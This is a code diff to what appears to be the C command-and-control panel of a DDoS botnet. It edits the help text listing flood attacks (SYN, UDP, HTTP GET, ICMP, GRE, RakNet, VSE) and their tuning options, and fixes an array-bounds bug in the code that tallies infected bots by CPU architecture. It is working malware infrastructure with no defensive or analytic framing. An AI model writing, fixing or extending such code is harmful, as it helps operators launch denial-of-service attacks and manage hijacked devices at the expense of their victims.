@@ -56,13 +56,13 @@ void handle_attack_list_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              CYAN "!vse - UDP Game VSE Query Flood\r\n"
              "!raknet - RakNet UnConnectedPing flood\r\n"
-             "!syn - TCP SYN Flood\r\n"
+             "!syn - TCP SYN+PSH Flood\r\n"
              "!socket - TCP Stream Connections Flood\r\n"
              "!http - HTTP 1.1 GET Flood\r\n"
              "!icmp - ICMP ECHO Flood\r\n"
              "!gre - GRE IP|TCP|UDP Specific Flood\r\n"
-             "!udp - Generic UDP Flood\r\n"
-             "!udpplain - UDP Flood optimised for PPS\r\n" RESET);
+             "!udp - Plain UDP Flood\r\n"
+             "!udpplain - Plain UDP Flood (FAST)\r\n" RESET);
 }
 
 /*
@@ -71,10 +71,10 @@ OPTHELP   C O M M A N D
 void handle_opthelp_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              RED "Optional Arguments:\r\n"
-             "psize - packet size (max: 64500-ICMP-UDP-SYN|1492-VSE-RakNet|1450-UDPPLAIN|8192-GRE)\r\n"
-             "srcport - srcport for UDP-SYN-GRE, Default=Random, max=65535\r\n"
+             "psize - packet size (max: 64500-ICMP-UDP-SYN | 1492 VSE-RakNet | 1450-UDPPLAIN | 8192-GRE)\r\n"
+             "srcport - srcport for UDP-SYN-GRE, Default=Random, max=65535)\r\n"
              "botcount - Limit bots to use\r\n"
-             "proto - GRE Proto (tcp/udp) default=IP\r\n"
+             "proto - GRE Proto (tcp/udp) default=none\r\n"
              "gport - destport for GRE\r\n"
             );
              }
@@ -531,7 +531,8 @@ void handle_attack_command(const User *user, const char *command, char *response
 }
 
 void handle_bots_command(char *response) {
-    static int arch_count[13];
+    #define NUM_ARCHS 13
+    static int arch_count[NUM_ARCHS];
     static const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "m68k", "i686", "sparc", "powerpc64", "sh4", "armhf", "arc700", "unknown"};
     static int valid_bots;
     int offset;
@@ -544,20 +545,20 @@ void handle_bots_command(char *response) {
         if (!bots[i].is_valid) continue;
         valid_bots++;
         int found = 0;
-        for (int j = 0; j < 13 && !found; j++) {
-            if (strcmp(bots[i].arch, arch_names[j]) == 0) {
+        for (int j = 0; j < NUM_ARCHS-1 && !found; j++) {
+            if (bots[i].arch != NULL && strcmp(bots[i].arch, arch_names[j]) == 0) {
                 arch_count[j]++;
                 found = 1;
             }
         }
         if (!found) {
-            arch_count[11]++; 
+            arch_count[NUM_ARCHS-1]++;
         }
     }
     pthread_mutex_unlock(&bot_mutex);
 
     offset = snprintf(response, MAX_COMMAND_LENGTH, YELLOW "Total bots: %d\n" RESET, valid_bots);
-    for (int i = 0; i < 14; i++) {
+    for (int i = 0; i < NUM_ARCHS; i++) {
         if (arch_count[i] > 0) {
             offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, CYAN "\r%s: %d\r\n" RESET, arch_names[i], arch_count[i]);
         }
